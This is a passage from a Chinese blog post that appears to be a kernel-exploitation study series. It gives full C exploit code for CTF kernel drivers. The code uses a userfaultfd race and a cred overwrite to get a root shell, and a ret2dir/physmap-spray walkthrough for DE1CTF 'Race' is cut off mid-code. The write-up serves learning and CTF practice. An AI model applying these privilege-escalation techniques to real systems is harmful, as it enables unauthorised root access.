class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NewCmd (-256)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DeleteCmd (-253)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ShowCmd (-254)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EditCmd (-255)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)(0x1337000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* contentPtr;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">userAttr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* user_buf;</span><br><span class="line">&#125;attr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    memset(buf,'\x00',0x1000);</span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]open dev failed"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]open success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">New</span><span class="params">(<span class="keyword">char</span>* usr_buf,<span class="keyword">uint8_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-256</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]create failed"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-253</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]delete error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-254</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to show"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Edit</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">size_t</span> length,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-255</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to Edit"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] Handler created"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> ready;</span><br><span class="line">   poll_fd.fd = uffd;</span><br><span class="line">   poll_fd.events= POLLIN;</span><br><span class="line">   ready = poll(&amp;poll_fd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span>(ready != <span class="number">1</span>)</span><br><span class="line">    ErrExit(<span class="string">"[-]poll failed!"</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+]Now we got to inject dirty code"</span>);</span><br><span class="line"></span><br><span class="line">   Delete();</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//init:node0+0x10buf</span></span><br><span class="line">   <span class="comment">//now:node0+node1</span></span><br><span class="line">   <span class="keyword">if</span>(read(uffd,&amp;msg,<span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">       ErrExit(<span class="string">"[-]Error reading msg"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">   memset(buf,'\x00',sizeof(buf));</span><br><span class="line">   buf[<span class="number">8</span>] = <span class="number">0xf0</span>;<span class="comment">//overwrite the note1's size = 0xf0</span></span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">   uc.len = <span class="number">0x1000</span>;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd,UFFDIO_COPY,&amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[*]userfault process success"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    Init();</span><br><span class="line">    New(buf,<span class="number">0x10</span>);</span><br><span class="line">    register_userfault();</span><br><span class="line">    <span class="comment">//create the 0x10 buf</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">1</span>,FAULT_PAGE);</span><br><span class="line">    <span class="comment">//now we mmap a address for later use</span></span><br><span class="line">    <span class="comment">//1.leak key:0 xor key == key</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak key:%lx\n"</span>,key);</span><br><span class="line">    <span class="comment">//note0:0x10</span></span><br><span class="line">    <span class="comment">//note1:0x10(size changed to 0xf0)</span></span><br><span class="line">    <span class="comment">//2.leak module base(real_module_base - base_page_off)</span></span><br><span class="line">    New(buf,<span class="number">0</span>);<span class="comment">//node2</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> bss_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(buf+<span class="number">0x10</span>) ^ key;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> module_base = bss_addr - <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak module base(sub page_base_offset):%lx\n"</span>,module_base);</span><br><span class="line">    <span class="comment">//3.leak page_base_off</span></span><br><span class="line">    <span class="comment">//overwrite the note2's contentPtr to module_base+0x1fa</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> page_offset_base = module_base+<span class="number">0x1fa</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* fake_note = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="keyword">int</span> page_offset_base_off;</span><br><span class="line">    memset(buf,'\x00',sizeof(buf));</span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">4</span> ^ key;<span class="comment">//we only need four bytes</span></span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;page_offset_base_off);</span><br><span class="line">    page_offset_base = module_base + <span class="number">0x1fe</span> + page_offset_base_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak page_base_offset:%lx\n"</span>,page_offset_base);</span><br><span class="line">    <span class="comment">//4.now we leak rael page off base</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> base_addr;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;base_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak real page base offset:%llx\n"</span>,base_addr);</span><br><span class="line">    <span class="comment">//search cred using task_struct</span></span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">"[*]WuHanJiaYou!"</span>);<span class="comment">//</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* task;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i; ;i += <span class="number">0xf0</span>)&#123;</span><br><span class="line">        fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">1</span>] = <span class="number">0xf0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">2</span>] = i ^ key;</span><br><span class="line">        Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">        Show(<span class="number">2</span>,buf);</span><br><span class="line">        task = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)memmem(buf,<span class="number">0xf0</span>,<span class="string">"[*]WuHanJiaYou!"</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(task != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+]found success,task:%p,cred:0x%lx,real_cred:0x%lx\n"</span>,task,task[<span class="number">-1</span>],task[<span class="number">-2</span>]);</span><br><span class="line">            <span class="keyword">if</span>(task[<span class="number">-1</span>]&gt;<span class="number">0xffff000000000000</span> &amp;&amp; task[<span class="number">-2</span>]&gt;<span class="number">0xffff000000000000</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ovwrite cred</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">0x28</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = (task[<span class="number">-2</span>]+<span class="number">4</span>-base_addr) ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    memset(buf,'\x00',0x30);</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="number">0x28</span>,buf);</span><br><span class="line">    <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execv(<span class="string">"/bin/sh"</span>,args);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>这种攻击最早是在<code>DE1CTF</code>见到的，当时<code>ycx</code>学长的博客有相关实践，当时对于内核完全摸不着头脑，现在大概懂了一些基本trick，翻一下<code>de1ta</code>在先知给的<a href="https://xz.aliyun.com/t/5944#toc-9" target="_blank" rel="noopener">writeup</a>，尝试学习一波。</p>
<h3 id="DE1CTF-Race"><a href="#DE1CTF-Race" class="headerlink" title="DE1CTF Race"></a>DE1CTF Race</h3><h4 id="程序分析-amp-amp-漏洞利用"><a href="#程序分析-amp-amp-漏洞利用" class="headerlink" title="程序分析 &amp;&amp; 漏洞利用"></a>程序分析 &amp;&amp; 漏洞利用</h4><p>跟之前那道题差不多，先看下自己实现的fops，发现全是空，ioctl是没有上锁的，<code>copy_from_user</code>和<code>copy_to_user</code>都是非原子操作。实现了<code>New</code>、<code>Edit</code>、<code>Show</code>和<code>Delete</code>功能。之前那道题目提到了别名页，实际上就是这里的<code>physmap</code>。</p>
<p>开始我自己想用的是之前提到的userfaultfd来保证竞争的结果可控，后来发现这个API好像用不了，只能利用mmap缺页造成的短暂中断间隙进行竞争删除。</p>
<p>官方的给的思路前面是用到了<code>physmap</code>的特性，就是这个地址的基址实际上是物理地址<code>physical_addr+offset</code>，可以绕过地址随机化。我们在<code>Show</code>的时候竞争删除，从而泄露出<code>slab</code>地址，根据官方的解释<code>physmap</code>的地址应该在<code>slab</code>前面，且包含<code>slab</code>，这个个人感觉是有依据的，之前在做xman那道题的时候看p4nda师傅博客给的爆破地址的起始地址就是没有开地址随机化的<code>physmap</code>位置。</p>
<p>猜测了<code>physmap</code>地址(不一定是起始地址，但是是在这个区域中的一个地址)，我们先用堆喷占位<code>physmap</code>区域，为了提高命中率我们分配的内存大小为<code>64M</code>，是整个进程的一半。在<code>Edit</code>的时候竞争删除，从而可以往<code>slab</code>的<code>fd</code>竞争写入刚才猜的地址。</p>
<p>后面官方的做法是分配<code>tty_struct</code>结构体，因为我们现在<code>slab</code>从<code>physmap</code>开始分配，<code>tty_struct</code>会分配到这块区域，之后我们<code>check</code>堆喷到的内存查看有无非零区域(<code>tty_struct</code>结构体里有一堆函数指针)，遇到非零值就说明找到了<code>slab_addr</code>并可以通过函数指针及偏移找到<code>vmlinux_base</code>，再往后官方是从<code>tty_struct</code>下手，我觉得既然有竞争的<code>UAF</code>可以改<code>modprobe_path</code>，应该更简单一点。</p>
<h4 id="exp-c-6"><a href="#exp-c-6" class="headerlink" title="exp.c"></a>exp.c</h4><p>自己实在是懒得写(或抄)exp，作为kernel入门篇的最后一篇文章也还是以官方的writeup收尾。注意这个exp后面有一个自己写内核shellcode的部分需要自己补充(这就是为什么我说不如改<code>modprobe_path</code>方便的原因)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_read		0x23333</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_write	0x23334</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_del		0x23335</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> thread_num		10	<span class="comment">//local 0x10; server 10</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp_size			1024*64 <span class="comment">//64K</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spray_times		32*32	<span class="comment">// heap spray size : 64K*16*32 = 32M</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel_offset		0x106b4e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_memory_x		0x55580</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *spray[spray_times];</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ptmx;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_quit</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s\n"</span>,arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race_kill</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ioctl(fd,test_ioctl_del, &amp;data);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">race_read</span><span class="params">()</span></span></span><br><span class="line"><span 